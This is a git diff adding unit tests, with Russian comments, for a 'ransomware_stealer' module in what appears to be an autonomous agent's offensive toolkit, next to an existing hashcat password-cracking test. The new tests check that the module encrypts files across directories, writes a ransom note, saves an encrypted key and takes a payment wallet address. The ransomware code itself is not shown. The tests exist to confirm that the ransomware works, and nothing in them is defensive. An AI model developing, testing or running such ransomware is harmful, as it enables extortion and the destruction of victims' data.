@@ -27,6 +27,7 @@ from agent_memory import AgentMemory
 from agent_thinker import AgentThinker
 from agent_modules.environment_manager import EnvironmentManager
 from agent_modules import offensive_tools
+from agent_modules import ransomware_stealer
 
 
 class TestAgentState(unittest.TestCase):
@@ -689,6 +690,52 @@ class TestOffensiveTools(unittest.TestCase):
         # Ожидаем ошибку, если hashcat не установлен или нет файлов
         result = offensive_tools.run_hashcat('hashes.txt', 'wordlist.txt')
         self.assertIn(result['status'], ['success', 'error'])
+
+
+class TestRansomwareStealer(unittest.TestCase):
+    def setUp(self):
+        self.test_dir = tempfile.mkdtemp()
+        self.wallet = "test_wallet_address"
+        # Создаем тестовые файлы
+        self.test_file = os.path.join(self.test_dir, "test.txt")
+        with open(self.test_file, 'w') as f:
+            f.write("test data")
+
+    def tearDown(self):
+        shutil.rmtree(self.test_dir)
+
+    def test_run_non_windows(self):
+        stealer = ransomware_stealer.RansomwareStealer(output_dir=self.test_dir, wallet_address=self.wallet)
+        # Принудительно подменяем sys_info для не-Windows
+        stealer.sys_info["os"] = "Linux"
+        result = stealer.run()
+        self.assertEqual(result["status"], "error")
+        self.assertIn("только на Windows", result["message"])
+
+    @patch("platform.system", return_value="Windows")
+    def test_encrypt_file(self, mock_platform):
+        stealer = ransomware_stealer.RansomwareStealer(output_dir=self.test_dir, wallet_address=self.wallet)
+        stealer.sys_info["os"] = "Windows"
+        stealer._encrypt_file(self.test_file)
+        # Проверяем, что файл был зашифрован (размер изменился)
+        with open(self.test_file, 'rb') as f:
+            data = f.read()
+        self.assertNotEqual(data, b"test data")
+        self.assertIn(self.test_file, stealer.encrypted_files)
+
+    @patch("platform.system", return_value="Windows")
+    def test_run_windows(self, mock_platform):
+        stealer = ransomware_stealer.RansomwareStealer(output_dir=self.test_dir, wallet_address=self.wallet)
+        stealer.sys_info["os"] = "Windows"
+        # Ограничиваем область шифрования только тестовой директорией
+        stealer._walk_and_encrypt(self.test_dir)
+        self.assertGreaterEqual(len(stealer.encrypted_files), 1)
+        # Проверяем, что ransom note создан
+        note_path = os.path.join(self.test_dir, stealer.ransom_note_name)
+        self.assertTrue(os.path.exists(note_path))
+        # Проверяем, что ключ сохранен
+        stealer._encrypt_key()
+        self.assertTrue(os.path.exists(stealer.encrypted_key_file))
 
 
 if __name__ == "__main__":
